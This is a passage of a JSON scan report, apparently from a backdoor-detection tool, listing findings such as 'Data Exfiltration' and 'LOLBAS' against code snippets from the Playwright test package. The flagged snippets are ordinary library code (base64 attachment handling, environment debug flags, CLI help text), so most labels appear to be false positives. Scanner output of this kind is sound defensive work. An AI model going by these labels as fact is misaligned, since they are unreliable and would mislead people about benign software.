                      "text": "        const sha1 = (0, _utils.calculateSha1)(content);\n        attachment.sha1 = sha1;\n        delete attachment.path;\n        delete attachment.base64;\n        if (sha1s.has(sha1)) continue;\n        sha1s.add(sha1);\n        zipFile.addBuffer(content, 'resources/' + sha1);\n",
                      "markdown": "`        const sha1 = (0, _utils.calculateSha1)(content);\n        attachment.sha1 = sha1;\n        delete attachment.path;\n        delete attachment.base64;\n        if (sha1s.has(sha1)) continue;\n        sha1s.add(sha1);\n        zipFile.addBuffer(content, 'resources/' + sha1);\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/worker/testTracing.js"
                },
                "region": {
                  "startLine": 165,
                  "startColumn": 209,
                  "endLine": 165,
                  "endColumn": 215,
                  "snippet": {
                    "text": "    for (const event of this._traceEvents.filter(e => e.type === 'after')) {\n      for (const attachment of event.attachments || []) {\n        let contentPromise;\n        if (attachment.path) contentPromise = _fs.default.promises.readFile(attachment.path).catch(() => undefined);else if (attachment.base64) contentPromise = Promise.resolve(Buffer.from(attachment.base64, 'base64'));\n        const content = await contentPromise;\n        if (content === undefined) continue;\n        const sha1 = (0, _utils.calculateSha1)(content);\n",
                    "rendered": {
                      "text": "    for (const event of this._traceEvents.filter(e => e.type === 'after')) {\n      for (const attachment of event.attachments || []) {\n        let contentPromise;\n        if (attachment.path) contentPromise = _fs.default.promises.readFile(attachment.path).catch(() => undefined);else if (attachment.base64) contentPromise = Promise.resolve(Buffer.from(attachment.base64, 'base64'));\n        const content = await contentPromise;\n        if (content === undefined) continue;\n        const sha1 = (0, _utils.calculateSha1)(content);\n",
                      "markdown": "`    for (const event of this._traceEvents.filter(e => e.type === 'after')) {\n      for (const attachment of event.attachments || []) {\n        let contentPromise;\n        if (attachment.path) contentPromise = _fs.default.promises.readFile(attachment.path).catch(() => undefined);else if (attachment.base64) contentPromise = Promise.resolve(Buffer.from(attachment.base64, 'base64'));\n        const content = await contentPromise;\n        if (content === undefined) continue;\n        const sha1 = (0, _utils.calculateSha1)(content);\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/worker/testTracing.js"
                },
                "region": {
                  "startLine": 165,
                  "startColumn": 200,
                  "endLine": 165,
                  "endColumn": 206,
                  "snippet": {
                    "text": "    for (const event of this._traceEvents.filter(e => e.type === 'after')) {\n      for (const attachment of event.attachments || []) {\n        let contentPromise;\n        if (attachment.path) contentPromise = _fs.default.promises.readFile(attachment.path).catch(() => undefined);else if (attachment.base64) contentPromise = Promise.resolve(Buffer.from(attachment.base64, 'base64'));\n        const content = await contentPromise;\n        if (content === undefined) continue;\n        const sha1 = (0, _utils.calculateSha1)(content);\n",
                    "rendered": {
                      "text": "    for (const event of this._traceEvents.filter(e => e.type === 'after')) {\n      for (const attachment of event.attachments || []) {\n        let contentPromise;\n        if (attachment.path) contentPromise = _fs.default.promises.readFile(attachment.path).catch(() => undefined);else if (attachment.base64) contentPromise = Promise.resolve(Buffer.from(attachment.base64, 'base64'));\n        const content = await contentPromise;\n        if (content === undefined) continue;\n        const sha1 = (0, _utils.calculateSha1)(content);\n",
                      "markdown": "`    for (const event of this._traceEvents.filter(e => e.type === 'after')) {\n      for (const attachment of event.attachments || []) {\n        let contentPromise;\n        if (attachment.path) contentPromise = _fs.default.promises.readFile(attachment.path).catch(() => undefined);else if (attachment.base64) contentPromise = Promise.resolve(Buffer.from(attachment.base64, 'base64'));\n        const content = await contentPromise;\n        if (content === undefined) continue;\n        const sha1 = (0, _utils.calculateSha1)(content);\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/worker/testTracing.js"
                },
                "region": {
                  "startLine": 165,
                  "startColumn": 136,
                  "endLine": 165,
                  "endColumn": 142,
                  "snippet": {
                    "text": "    for (const event of this._traceEvents.filter(e => e.type === 'after')) {\n      for (const attachment of event.attachments || []) {\n        let contentPromise;\n        if (attachment.path) contentPromise = _fs.default.promises.readFile(attachment.path).catch(() => undefined);else if (attachment.base64) contentPromise = Promise.resolve(Buffer.from(attachment.base64, 'base64'));\n        const content = await contentPromise;\n        if (content === undefined) continue;\n        const sha1 = (0, _utils.calculateSha1)(content);\n",
                    "rendered": {
                      "text": "    for (const event of this._traceEvents.filter(e => e.type === 'after')) {\n      for (const attachment of event.attachments || []) {\n        let contentPromise;\n        if (attachment.path) contentPromise = _fs.default.promises.readFile(attachment.path).catch(() => undefined);else if (attachment.base64) contentPromise = Promise.resolve(Buffer.from(attachment.base64, 'base64'));\n        const content = await contentPromise;\n        if (content === undefined) continue;\n        const sha1 = (0, _utils.calculateSha1)(content);\n",
                      "markdown": "`    for (const event of this._traceEvents.filter(e => e.type === 'after')) {\n      for (const attachment of event.attachments || []) {\n        let contentPromise;\n        if (attachment.path) contentPromise = _fs.default.promises.readFile(attachment.path).catch(() => undefined);else if (attachment.base64) contentPromise = Promise.resolve(Buffer.from(attachment.base64, 'base64'));\n        const content = await contentPromise;\n        if (content === undefined) continue;\n        const sha1 = (0, _utils.calculateSha1)(content);\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/worker/testTracing.js"
                },
                "region": {
                  "startLine": 60,
                  "startColumn": 8,
                  "endLine": 60,
                  "endColumn": 19,
                  "snippet": {
                    "text": "    wallTime: Date.now(),\n      monotonicTime: (0, _utils.monotonicTime)(),\n      sdkLanguage: 'javascript'\n    };\n    this._appendTraceEvent(this._contextCreatedEvent);\n  }\n  _shouldCaptureTrace() {\n    var _this$_options, _this$_options2, _this$_options3, _this$_options4, _this$_options5;\n    if (process.env.PW_TEST_DISABLE_TRACING) return false;\n    if (((_this$_options = this._options) === null || _this$_options === void 0 ? void 0 : _this$_options.mode) === 'on') return true;\n    if (((_this$_options2 = this._options) === null || _this$_options2 === void 0 ? void 0 : _this$_options2.mode) === 'retai",
                    "rendered": {
                      "text": "    wallTime: Date.now(),\n      monotonicTime: (0, _utils.monotonicTime)(),\n      sdkLanguage: 'javascript'\n    };\n    this._appendTraceEvent(this._contextCreatedEvent);\n  }\n  _shouldCaptureTrace() {\n    var _this$_options, _this$_options2, _this$_options3, _this$_options4, _this$_options5;\n    if (process.env.PW_TEST_DISABLE_TRACING) return false;\n    if (((_this$_options = this._options) === null || _this$_options === void 0 ? void 0 : _this$_options.mode) === 'on') return true;\n    if (((_this$_options2 = this._options) === null || _this$_options2 === void 0 ? void 0 : _this$_options2.mode) === 'retai",
                      "markdown": "`    wallTime: Date.now(),\n      monotonicTime: (0, _utils.monotonicTime)(),\n      sdkLanguage: 'javascript'\n    };\n    this._appendTraceEvent(this._contextCreatedEvent);\n  }\n  _shouldCaptureTrace() {\n    var _this$_options, _this$_options2, _this$_options3, _this$_options4, _this$_options5;\n    if (process.env.PW_TEST_DISABLE_TRACING) return false;\n    if (((_this$_options = this._options) === null || _this$_options === void 0 ? void 0 : _this$_options.mode) === 'on') return true;\n    if (((_this$_options2 = this._options) === null || _this$_options2 === void 0 ? void 0 : _this$_options2.mode) === 'retai`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/util.js"
                },
                "region": {
                  "startLine": 214,
                  "startColumn": 40,
                  "endLine": 214,
                  "endColumn": 45,
                  "snippet": {
                    "text": "const callLogText = exports.callLogText = _utils.formatCallLog;\nconst folderToPackageJsonPath = new Map();\nfunction getPackageJsonPath(folderPath) {\n  const cached = folderToPackageJsonPath.get(folderPath);\n  if (cached !== undefined) return cached;\n  const packageJsonPath = _path.default.join(folderPath, 'package.json');\n  if (_fs.default.existsSync(packageJsonPath)) {\n",
                    "rendered": {
                      "text": "const callLogText = exports.callLogText = _utils.formatCallLog;\nconst folderToPackageJsonPath = new Map();\nfunction getPackageJsonPath(folderPath) {\n  const cached = folderToPackageJsonPath.get(folderPath);\n  if (cached !== undefined) return cached;\n  const packageJsonPath = _path.default.join(folderPath, 'package.json');\n  if (_fs.default.existsSync(packageJsonPath)) {\n",
                      "markdown": "`const callLogText = exports.callLogText = _utils.formatCallLog;\nconst folderToPackageJsonPath = new Map();\nfunction getPackageJsonPath(folderPath) {\n  const cached = folderToPackageJsonPath.get(folderPath);\n  if (cached !== undefined) return cached;\n  const packageJsonPath = _path.default.join(folderPath, 'package.json');\n  if (_fs.default.existsSync(packageJsonPath)) {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/util.js"
                },
                "region": {
                  "startLine": 72,
                  "startColumn": 7,
                  "endLine": 72,
                  "endColumn": 18,
                  "snippet": {
                    "text": "}\nfunction filterStackFile(file) {\n  if (!process.env.PWDEBUGIMPL && file.startsWith(PLAYWRIGHT_TEST_PATH)) return false;\n  if (!process.env.PWDEBUGIMPL && file.startsWith(PLAYWRIGHT_CORE_PATH)) return false;\n  return true;\n}\nfunction filteredStackTrace(rawStack) {\n",
                    "rendered": {
                      "text": "}\nfunction filterStackFile(file) {\n  if (!process.env.PWDEBUGIMPL && file.startsWith(PLAYWRIGHT_TEST_PATH)) return false;\n  if (!process.env.PWDEBUGIMPL && file.startsWith(PLAYWRIGHT_CORE_PATH)) return false;\n  return true;\n}\nfunction filteredStackTrace(rawStack) {\n",
                      "markdown": "`}\nfunction filterStackFile(file) {\n  if (!process.env.PWDEBUGIMPL && file.startsWith(PLAYWRIGHT_TEST_PATH)) return false;\n  if (!process.env.PWDEBUGIMPL && file.startsWith(PLAYWRIGHT_CORE_PATH)) return false;\n  return true;\n}\nfunction filteredStackTrace(rawStack) {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/util.js"
                },
                "region": {
                  "startLine": 71,
                  "startColumn": 7,
                  "endLine": 71,
                  "endColumn": 18,
                  "snippet": {
                    "text": "  };\n}\nfunction filterStackFile(file) {\n  if (!process.env.PWDEBUGIMPL && file.startsWith(PLAYWRIGHT_TEST_PATH)) return false;\n  if (!process.env.PWDEBUGIMPL && file.startsWith(PLAYWRIGHT_CORE_PATH)) return false;\n  return true;\n}\n",
                    "rendered": {
                      "text": "  };\n}\nfunction filterStackFile(file) {\n  if (!process.env.PWDEBUGIMPL && file.startsWith(PLAYWRIGHT_TEST_PATH)) return false;\n  if (!process.env.PWDEBUGIMPL && file.startsWith(PLAYWRIGHT_CORE_PATH)) return false;\n  return true;\n}\n",
                      "markdown": "`  };\n}\nfunction filterStackFile(file) {\n  if (!process.env.PWDEBUGIMPL && file.startsWith(PLAYWRIGHT_TEST_PATH)) return false;\n  if (!process.env.PWDEBUGIMPL && file.startsWith(PLAYWRIGHT_CORE_PATH)) return false;\n  return true;\n}\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/util.js"
                },
                "region": {
                  "startLine": 60,
                  "startColumn": 6,
                  "endLine": 60,
                  "endColumn": 17,
                  "snippet": {
                    "text": "function filterStackTrace(e) {\n  var _e$stack;\n  const name = e.name ? e.name + ': ' : '';\n  if (process.env.PWDEBUGIMPL) return {\n    message: name + e.message,\n    stack: e.stack || ''\n  };\n",
                    "rendered": {
                      "text": "function filterStackTrace(e) {\n  var _e$stack;\n  const name = e.name ? e.name + ': ' : '';\n  if (process.env.PWDEBUGIMPL) return {\n    message: name + e.message,\n    stack: e.stack || ''\n  };\n",
                      "markdown": "`function filterStackTrace(e) {\n  var _e$stack;\n  const name = e.name ? e.name + ': ' : '';\n  if (process.env.PWDEBUGIMPL) return {\n    message: name + e.message,\n    stack: e.stack || ''\n  };\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/program.js"
                },
                "region": {
                  "startLine": 328,
                  "startColumn": 2136,
                  "endLine": 328,
                  "endColumn": 2145,
                  "snippet": {
                    "text": "efaultReporter}\")`], ['--retries <retries>', `Maximum retry count for flaky tests, zero for no retries (default: no retries)`], ['--shard <shard>', `Shard tests and execute only the selected shard, specify in the form \"current/all\", 1-based, for example \"3/5\"`], ['--timeout <timeout>', `Specify test timeout threshold in milliseconds, zero for unlimited (default: ${_config.defaultTimeout})`], ['--trace <mode>', `Force tracing mode, can be ${kTraceModes.map(mode => `\"${mode}\"`).join(', ')}`], ['--ui', `Run tests in interactive UI mode`], ['--ui-host <host>', 'Host to serve UI on; specifying this option o",
                    "rendered": {
                      "text": "efaultReporter}\")`], ['--retries <retries>', `Maximum retry count for flaky tests, zero for no retries (default: no retries)`], ['--shard <shard>', `Shard tests and execute only the selected shard, specify in the form \"current/all\", 1-based, for example \"3/5\"`], ['--timeout <timeout>', `Specify test timeout threshold in milliseconds, zero for unlimited (default: ${_config.defaultTimeout})`], ['--trace <mode>', `Force tracing mode, can be ${kTraceModes.map(mode => `\"${mode}\"`).join(', ')}`], ['--ui', `Run tests in interactive UI mode`], ['--ui-host <host>', 'Host to serve UI on; specifying this option o",
                      "markdown": "`efaultReporter}\")`], ['--retries <retries>', `Maximum retry count for flaky tests, zero for no retries (default: no retries)`], ['--shard <shard>', `Shard tests and execute only the selected shard, specify in the form \"current/all\", 1-based, for example \"3/5\"`], ['--timeout <timeout>', `Specify test timeout threshold in milliseconds, zero for unlimited (default: ${_config.defaultTimeout})`], ['--trace <mode>', `Force tracing mode, can be ${kTraceModes.map(mode => `\"${mode}\"`).join(', ')}`], ['--ui', `Run tests in interactive UI mode`], ['--ui-host <host>', 'Host to serve UI on; specifying this option o`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/program.js"
                },
                "region": {
                  "startLine": 328,
                  "startColumn": 682,
                  "endLine": 328,
                  "endColumn": 688,
                  "snippet": {
                    "text": "ilures=1 --headed --workers=1\" options`], ['--fail-on-flaky-tests', `Fail if any test is flagged as flaky (default: false)`], ['--forbid-only', `Fail if test.only is called (default: false)`], ['--fully-parallel', `Run all tests in parallel (default: false)`], ['--global-timeout <timeout>', `Maximum time this test suite can run in milliseconds (default: unlimited)`], ['-g, --grep <grep>', `Only run tests matching this regular expression (default: \".*\")`], ['-gv, --grep-invert <grep>', `Only run tests that do not match this regular expression`], ['--headed', `Run tests in headed browsers (default: he",
                    "rendered": {
                      "text": "ilures=1 --headed --workers=1\" options`], ['--fail-on-flaky-tests', `Fail if any test is flagged as flaky (default: false)`], ['--forbid-only', `Fail if test.only is called (default: false)`], ['--fully-parallel', `Run all tests in parallel (default: false)`], ['--global-timeout <timeout>', `Maximum time this test suite can run in milliseconds (default: unlimited)`], ['-g, --grep <grep>', `Only run tests matching this regular expression (default: \".*\")`], ['-gv, --grep-invert <grep>', `Only run tests that do not match this regular expression`], ['--headed', `Run tests in headed browsers (default: he",
                      "markdown": "`ilures=1 --headed --workers=1\" options`], ['--fail-on-flaky-tests', `Fail if any test is flagged as flaky (default: false)`], ['--forbid-only', `Fail if test.only is called (default: false)`], ['--fully-parallel', `Run all tests in parallel (default: false)`], ['--global-timeout <timeout>', `Maximum time this test suite can run in milliseconds (default: unlimited)`], ['-g, --grep <grep>', `Only run tests matching this regular expression (default: \".*\")`], ['-gv, --grep-invert <grep>', `Only run tests that do not match this regular expression`], ['--headed', `Run tests in headed browsers (default: he`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/program.js"
                },
                "region": {
                  "startLine": 27,
                  "startColumn": 233,
                  "endLine": 27,
                  "endColumn": 238,
                  "snippet": {
                    "text": "etRequireWildcardCache = function (e) { return e ? t : r; })(e); }\nfunction _interopRequireWildcard(e, r) { if (!r && e && e.__esModule) return e; if (null === e || \"object\" != typeof e && \"function\" != typeof e) return { default: e }; var t = _getRequireWildcardCache(r); if (t && t.has(e)) return t.get(e); var n = { __proto__: null }, a = Object.defineProperty && Object.getOwnPropertyDescriptor; for (var u in e) if (\"default\" !== u && Object.prototype.hasOwnProperty.call(e, u)) { var i = a ? Object.getOwnPropertyDescriptor(e, u) : null; i && (i.get || i.set) ? Object.defineProperty(n, u, i) : n[u]",
                    "rendered": {
                      "text": "etRequireWildcardCache = function (e) { return e ? t : r; })(e); }\nfunction _interopRequireWildcard(e, r) { if (!r && e && e.__esModule) return e; if (null === e || \"object\" != typeof e && \"function\" != typeof e) return { default: e }; var t = _getRequireWildcardCache(r); if (t && t.has(e)) return t.get(e); var n = { __proto__: null }, a = Object.defineProperty && Object.getOwnPropertyDescriptor; for (var u in e) if (\"default\" !== u && Object.prototype.hasOwnProperty.call(e, u)) { var i = a ? Object.getOwnPropertyDescriptor(e, u) : null; i && (i.get || i.set) ? Object.defineProperty(n, u, i) : n[u]",
                      "markdown": "`etRequireWildcardCache = function (e) { return e ? t : r; })(e); }\nfunction _interopRequireWildcard(e, r) { if (!r && e && e.__esModule) return e; if (null === e || \"object\" != typeof e && \"function\" != typeof e) return { default: e }; var t = _getRequireWildcardCache(r); if (t && t.has(e)) return t.get(e); var n = { __proto__: null }, a = Object.defineProperty && Object.getOwnPropertyDescriptor; for (var u in e) if (\"default\" !== u && Object.prototype.hasOwnProperty.call(e, u)) { var i = a ? Object.getOwnPropertyDescriptor(e, u) : null; i && (i.get || i.set) ? Object.defineProperty(n, u, i) : n[u]`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/program.js"
                },
                "region": {
                  "startLine": 306,
                  "startColumn": 4,
                  "endLine": 306,
                  "endColumn": 15,
                  "snippet": {
                    "text": "    overrides.maxFailures = 1;\n    overrides.timeout = 0;\n    overrides.workers = 1;\n    process.env.PWDEBUG = '1';\n  }\n  if (!options.ui && options.trace) {\n    if (!kTraceModes.includes(options.trace)) throw new Error(`Unsupported trace mode \"${options.trace}\", must be one of ${kTraceModes.map(mode => `\"${mode}\"`).join(', ')}`);\n",
                    "rendered": {
                      "text": "    overrides.maxFailures = 1;\n    overrides.timeout = 0;\n    overrides.workers = 1;\n    process.env.PWDEBUG = '1';\n  }\n  if (!options.ui && options.trace) {\n    if (!kTraceModes.includes(options.trace)) throw new Error(`Unsupported trace mode \"${options.trace}\", must be one of ${kTraceModes.map(mode => `\"${mode}\"`).join(', ')}`);\n",
                      "markdown": "`    overrides.maxFailures = 1;\n    overrides.timeout = 0;\n    overrides.workers = 1;\n    process.env.PWDEBUG = '1';\n  }\n  if (!options.ui && options.trace) {\n    if (!kTraceModes.includes(options.trace)) throw new Error(`Unsupported trace mode \"${options.trace}\", must be one of ${kTraceModes.map(mode => `\"${mode}\"`).join(', ')}`);\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/program.js"
                },
                "region": {
                  "startLine": 207,
                  "startColumn": 6,
                  "endLine": 207,
                  "endColumn": 17,
                  "snippet": {
                    "text": "  config.cliFailOnFlakyTests = !!opts.failOnFlakyTests;\n  const runner = new _runner.Runner(config);\n  let status;\n  if (process.env.PWTEST_WATCH) status = await runner.watchAllTests();else status = await runner.runAllTests();\n  await (0, _utils.stopProfiling)('runner');\n  const exitCode = status === 'interrupted' ? 130 : status === 'passed' ? 0 : 1;\n  (0, _utils.gracefullyProcessExitDoNotHang)(exitCode);\n",
                    "rendered": {
                      "text": "  config.cliFailOnFlakyTests = !!opts.failOnFlakyTests;\n  const runner = new _runner.Runner(config);\n  let status;\n  if (process.env.PWTEST_WATCH) status = await runner.watchAllTests();else status = await runner.runAllTests();\n  await (0, _utils.stopProfiling)('runner');\n  const exitCode = status === 'interrupted' ? 130 : status === 'passed' ? 0 : 1;\n  (0, _utils.gracefullyProcessExitDoNotHang)(exitCode);\n",
                      "markdown": "`  config.cliFailOnFlakyTests = !!opts.failOnFlakyTests;\n  const runner = new _runner.Runner(config);\n  let status;\n  if (process.env.PWTEST_WATCH) status = await runner.watchAllTests();else status = await runner.runAllTests();\n  await (0, _utils.stopProfiling)('runner');\n  const exitCode = status === 'interrupted' ? 130 : status === 'passed' ? 0 : 1;\n  (0, _utils.gracefullyProcessExitDoNotHang)(exitCode);\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/index.js"
                },
                "region": {
                  "startLine": 574,
                  "startColumn": 62,
                  "endLine": 574,
                  "endColumn": 71,
                  "snippet": {
                    "text": "    const context = await browser._newContextForReuse(defaultContextOptions);\n    context[kIsReusedContext] = true;\n    await use(context);\n    const closeReason = testInfo.status === 'timedOut' ? 'Test timeout of ' + testInfo.timeout + 'ms exceeded.' : 'Test ended.';\n    await browser._stopPendingOperations(closeReason);\n  },\n  page: async ({\n",
                    "rendered": {
                      "text": "    const context = await browser._newContextForReuse(defaultContextOptions);\n    context[kIsReusedContext] = true;\n    await use(context);\n    const closeReason = testInfo.status === 'timedOut' ? 'Test timeout of ' + testInfo.timeout + 'ms exceeded.' : 'Test ended.';\n    await browser._stopPendingOperations(closeReason);\n  },\n  page: async ({\n",
                      "markdown": "`    const context = await browser._newContextForReuse(defaultContextOptions);\n    context[kIsReusedContext] = true;\n    await use(context);\n    const closeReason = testInfo.status === 'timedOut' ? 'Test timeout of ' + testInfo.timeout + 'ms exceeded.' : 'Test ended.';\n    await browser._stopPendingOperations(closeReason);\n  },\n  page: async ({\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/index.js"
                },
                "region": {
                  "startLine": 505,
                  "startColumn": 62,
                  "endLine": 505,
                  "endColumn": 71,
                  "snippet": {
                    "text": "      return context;\n    });\n    let counter = 0;\n    const closeReason = testInfo.status === 'timedOut' ? 'Test timeout of ' + testInfo.timeout + 'ms exceeded.' : 'Test ended.';\n    await Promise.all([...contexts.keys()].map(async context => {\n      await context._wrapApiCall(async () => {\n        await context.close({\n",
                    "rendered": {
                      "text": "      return context;\n    });\n    let counter = 0;\n    const closeReason = testInfo.status === 'timedOut' ? 'Test timeout of ' + testInfo.timeout + 'ms exceeded.' : 'Test ended.';\n    await Promise.all([...contexts.keys()].map(async context => {\n      await context._wrapApiCall(async () => {\n        await context.close({\n",
                      "markdown": "`      return context;\n    });\n    let counter = 0;\n    const closeReason = testInfo.status === 'timedOut' ? 'Test timeout of ' + testInfo.timeout + 'ms exceeded.' : 'Test ended.';\n    await Promise.all([...contexts.keys()].map(async context => {\n      await context._wrapApiCall(async () => {\n        await context.close({\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/index.js"
                },
                "region": {
                  "startLine": 517,
                  "startColumn": 20,
                  "endLine": 517,
                  "endColumn": 25,
                  "snippet": {
                    "text": "      if (preserveVideo) {\n        const {\n          pagesWithVideo: pagesForVideo\n        } = contexts.get(context);\n        const videos = pagesForVideo.map(p => p.video()).filter(Boolean);\n        await Promise.all(videos.map(async v => {\n          try {\n",
                    "rendered": {
                      "text": "      if (preserveVideo) {\n        const {\n          pagesWithVideo: pagesForVideo\n        } = contexts.get(context);\n        const videos = pagesForVideo.map(p => p.video()).filter(Boolean);\n        await Promise.all(videos.map(async v => {\n          try {\n",
                      "markdown": "`      if (preserveVideo) {\n        const {\n          pagesWithVideo: pagesForVideo\n        } = contexts.get(context);\n        const videos = pagesForVideo.map(p => p.video()).filter(Boolean);\n        await Promise.all(videos.map(async v => {\n          try {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/index.js"
                },
                "region": {
                  "startLine": 41,
                  "startColumn": 233,
                  "endLine": 41,
                  "endColumn": 238,
                  "snippet": {
                    "text": "etRequireWildcardCache = function (e) { return e ? t : r; })(e); }\nfunction _interopRequireWildcard(e, r) { if (!r && e && e.__esModule) return e; if (null === e || \"object\" != typeof e && \"function\" != typeof e) return { default: e }; var t = _getRequireWildcardCache(r); if (t && t.has(e)) return t.get(e); var n = { __proto__: null }, a = Object.defineProperty && Object.getOwnPropertyDescriptor; for (var u in e) if (\"default\" !== u && Object.prototype.hasOwnProperty.call(e, u)) { var i = a ? Object.getOwnPropertyDescriptor(e, u) : null; i && (i.get || i.set) ? Object.defineProperty(n, u, i) : n[u]",
